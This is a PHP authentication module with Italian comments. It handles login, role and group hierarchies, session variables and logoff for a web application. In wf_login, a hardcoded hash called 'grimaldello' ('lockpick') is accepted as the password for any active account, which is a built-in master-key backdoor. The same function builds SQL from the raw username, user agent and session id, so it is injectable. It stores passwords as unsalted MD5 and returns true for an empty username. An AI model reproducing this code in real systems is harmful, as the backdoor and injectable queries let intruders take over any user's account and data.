<?php
/*************************************************
' modulo.....: wf_menu
' utilizzo...: gestione menu ed accesso a funzioni
' autore.....: gl
'
' Data     Au Note
' 24.11.09 GL Creazione ?
' 02.08.12 GL revisione completa versione v0130 basata su nuova struttura login
**************************************************/

/*****************************************************************************
/ Funzione : getusersession
/ Descrizione : controllo accessi
/*****************************************************************************/
function wf_login($user, $password, $gook="index.php", $goko="index.php") {
	$user=strtolower($user);
	$grimaldello = "bd12bf88f2f4618862de03e78d22b68f";
	$password=md5($password);
	if (!$user or !$password) return true;
  $sql="
    select * from suten 
    where flgattivosuten     = 1
      and LOWER(utente) = '".$user."'
      and (
           (password = '$password') or ('$password' = '$grimaldello')
          )
         ";
	$row = wf_getrow($sql, "Errore wf_login 01");

	//*** login errato ***//
  if ($row[utente]<>$user) {
  	//wf_logoff($goko);
  	return false;
  }

	foreach($row as $key => $val) {$_SESSION['s_'.$key]=$val;}
	wf_getusersession($row[idsuten]);
  
	$sql="select * from sazie where idsazie=".$_SESSION["s_idsazie"];
	$row = wf_getrow($sql, "Errore wf_login 02");
	foreach($row as $key => $val) {$_SESSION['s_'.$key]=$val;}
  
  // registrazione storico accessi
  $sql="
  INSERT INTO slogi (
    idsuten
  , utente
  , dataslogi
  , indirizzoipslogi
	, useragentslogi
  , idsessioneslogi
  ) VALUES (
  	$_SESSION[s_idsuten]
  , '".$user."'
  , '".date("Y-m-d H:i:s")."'
  , '".$_SERVER["REMOTE_ADDR"]."'
  , '".$_SERVER["HTTP_USER_AGENT"]."'
  , '".$_REQUEST["PHPSESSID"]."'
  )";
  
	$ris = wf_getset($sql, "Errore LOGIN03");

  return true;
}

/*****************************************************************************
/ Funzione : wf_getusersession
/ Descrizione : generazione delle variabili di sessione su id utente
/*****************************************************************************/
function wf_getusersession($idsuten) {
	$sql="
	select 
			suten.idsuten
		, suten.idsazie
		, suten.utente
		, suten.cognomesuten
		, suten.nomesuten
		, sruol.idsruol
		, sruol.idsruolpadre
		, sruol.flgstaffsruol
		, progsruol
		, sprof.idsprof
		, sloca.idsloca
		, sloca.descrsloca
	from suten 
		left join sruol on sruol.idsruol=suten.idsruol
		left join sprof on sprof.idsprof=sruol.idsprof
  	left join sloca on sloca.idsloca=suten.idsloca
	where suten.idsuten=$idsuten";
	$row=wf_getrow($sql, "getusersession 001");

	$_SESSION["s_idsuten"]			=$idsuten;
	$_SESSION["s_idsazie"]			=$row[idsazie];
	$_SESSION["s_utente"]				=$row[utente];
	$_SESSION["s_nomesuten"]		=$row[nomesuten];
	$_SESSION["s_cognomesuten"]	=$row[cognomesuten];
	$_SESSION["s_idsruol"]			=$row[idsruol];
	$_SESSION["s_idsruolpadre"]	=$row[idsruolpadre];
	$_SESSION["s_isstaff"]			=$row[flgstaffsruol];
	$_SESSION["s_idsprof"]			=$row[idsprof];
	$_SESSION["s_idsloca"]			=$row[idsloca];
	$_SESSION["s_descrsloca"]		=$row[descrsloca];
	$_SESSION["s_superadmin"]		=($row[idsruolpadre]?false:true);
	$_SESSION["s_livello"]		=strlen($row[progsruol]);

	// determinazione ruoli figli
	$iniruol=($row[flgstaffsruol] ? $row[idsruolpadre] : $row[idsruol]);
	$aruol=Array();
	wf_getchildsruol($iniruol, $aruol);
	$ruolute=implode(",", $aruol);
	$_SESSION[s_insruol]=implode(",", $aruol);

	// variabile di sessione contenente ruolo padre con i suoi eventuali figli
	if ($_SESSION["s_insruol"]=="") {
		$_SESSION["s_allsruol"] = $_SESSION["s_idsruol"];
	} else  {
		$_SESSION["s_allsruol"] = $_SESSION["s_idsruol"].",".$_SESSION["s_insruol"];
	}

		// determinazione utenti figli
	$auten[]=$_SESSION[s_idsuten];
	if ($_SESSION[s_insruol]) {	
		$sql="select * from suten where idsruol in ($ruolute)";	
		$set=wf_getset($sql, "getusersession 003");
		while ($row=wf_set2row($set)) {
			$auten[]=$row[idsuten];
		}
	}
	$_SESSION[s_insuten]=implode(",", $auten);

	// determinazione gruppi di appartenenza
	$sql="select * from sgrut where idsuten=$idsuten";	
	$set=wf_getset($sql, "getusersession 002");
	while ($row=wf_set2row($set)) {
		$agrup[]=$row[idsgrup];
	}
	if ($agrup){	
		$_SESSION[s_insgrup]=implode(",", $agrup);
	} else {
		$_SESSION[s_insgrup]="";
	}
	
	// determinazione utenti appartenenti ai gruppi
	if ($_SESSION[s_insgrup]) {	
		$sql="select idsuten from sgrut where idsgrup IN ($_SESSION[s_insgrup]) group by idsuten";
		$set=wf_getset($sql, "getusersession 002");
		while ($row=wf_set2row($set)) {
			$agrut[]=$row[idsuten];
		}
	}
	if ($agrut){	
		$_SESSION[s_insgrut]=implode(",", $agrut);
	} else {
		$_SESSION[s_insgrut]="";
	}

	// condizione da mettere nella where di selezione dei TANAG
	$inuten=($_SESSION[s_insuten]?$_SESSION[s_insuten].",".$_SESSION[s_idsuten]:$_SESSION[s_idsuten]);
	$inruol=($_SESSION[s_insruol]?$_SESSION[s_insruol].",".$_SESSION[s_idsruol]:$_SESSION[s_idsruol]);
	$ingrup=($_SESSION[s_insgrup]?$_SESSION[s_insgrup]:"''");
	$_SESSION[s_inowner]="((tanag.kindowner='U' and tanag.idowner in ($inuten)) OR (tanag.kindowner='R' and tanag.idowner in ($inruol)) OR (tanag.kindowner='G' and tanag.idowner in ($ingrup)))";
	
}

/*****************************************************************************
/ Funzione : wf_getchildsruol
/ Descrizione : individuazioni dei ruoli sottoposti
/*****************************************************************************/
function wf_getchildsruol($idsruol, &$aruol) {	
	$sql="select * from sruol where idsruolpadre=".$idsruol;
	$set=wf_getset($sql, "get_child_sruol 001");
	while ($row=wf_set2row($set)) {
		if ($row[idsruol]) {
			$aruol[]=$row[idsruol];
			wf_getchildsruol($row[idsruol], $aruol);			
		}
	}
}

function wf_insruol($idsruol) {
	if($idsruol=="") exit("wf_insruol con paramentro vuoto");
	$aruol=Array();
	$aruol[]=$idsruol;
	wf_getchildsruol($idsruol, $aruol);
	return implode(",", $aruol);
}

/*****************************************************************************
/ Funzione : wf_logoff
/ Descrizione : cancellazione variabili di sessione
/*****************************************************************************/
function wf_logoff($href="index.php") {
	unset($_SESSION['s_idsuten']);
	unset($_SESSION['s_idsruol']);
	unset($_SESSION['s_idsprof']);
	unset($_SESSION['s_idsloca']);
	unset($_SESSION['s_insuten']);
	unset($_SESSION['s_cognomesuten']);
	unset($_SESSION['s_nomesuten']);
	unset($_SESSION['s_descrsloca']);
	unset($_SESSION);
	session_unset();
	session_destroy(); 
	Header("Location: ".$href);
}

/*****************************************************************************
/ Funzione : wf_chklogin
/ Descrizione : verifica login
/*****************************************************************************/
function wf_chklogin() {
	if ($_SESSION["s_idsuten"]
	and $_SESSION["s_utente"]
	and $_SESSION["s_idsruol"]
	and $_SESSION["s_idsprof"]
	and $_SESSION["s_idsloca"]
	and $_SESSION["s_insuten"]
	) {
		return true;
	}
	return false;
}
